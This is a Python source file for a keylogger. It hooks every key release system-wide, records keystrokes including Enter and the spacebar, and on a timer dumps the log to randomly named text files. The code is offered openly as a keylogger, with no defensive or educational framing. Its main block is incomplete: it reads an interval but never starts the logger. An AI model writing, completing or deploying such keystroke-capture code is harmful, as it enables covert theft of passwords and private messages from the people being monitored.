import keyboard
from threading import Timer
from datetime import datetime
import random


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_time = datetime.now()
        self.stop_time = datetime.now()

    def start_logging(self, event):
        key_name = event.name
        if len(key_name) > 1:
            if key_name == "enter":
                key_name = "[Enter Key]\n"
            elif key_name == "space":
                key_name = "[Spacebar]"
            elif key_name == "decimal":
                key_name = "."
            else:
                key_name = key_name.replace(" ", "_")
                key_name = f"[{key_name.upper()}]"

        self.log += key_name

    def generate_txt_file(self):
        filename = f"Logfile{random.random()}"
        with open(f"{filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"File saved successfully as {filename}")

    def generate(self):

        if self.log:
            self.stop_time = datetime.now()
            self.generate_txt_file()
            self.start_time = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.generate)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_time = datetime.now()
        keyboard.on_release(callback=self.start_logging)
        self.generate()
        keyboard.wait()


if __name__ == "__main__":
    print(f"Started Keylogger....")
    interval = input("Enter the interval to get generate the keylogger file (Enter number in sec) (For 1 min - Enter 60): ")
    print(f"Okay.. You have set the interval to {interval} seconds...")


